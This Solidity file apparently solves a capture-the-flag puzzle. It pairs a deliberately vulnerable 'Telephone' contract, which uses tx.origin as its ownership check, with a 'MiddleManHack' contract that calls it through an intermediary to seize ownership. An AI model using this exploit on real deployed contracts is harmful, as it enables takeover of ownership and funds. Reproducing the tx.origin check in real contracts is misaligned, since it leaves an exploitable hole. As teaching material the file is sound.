// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function getOwner() public view returns (address) {
        return owner;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract MiddleManHack {
    address private _owner;

    constructor() {
        _owner = msg.sender;
    }

    function hack(address _tel) public {
        (bool success, ) = _tel.call(
            abi.encodeWithSignature("changeOwner(address)", _owner)
        );

        require(success, "Hack is not success");
    }
}
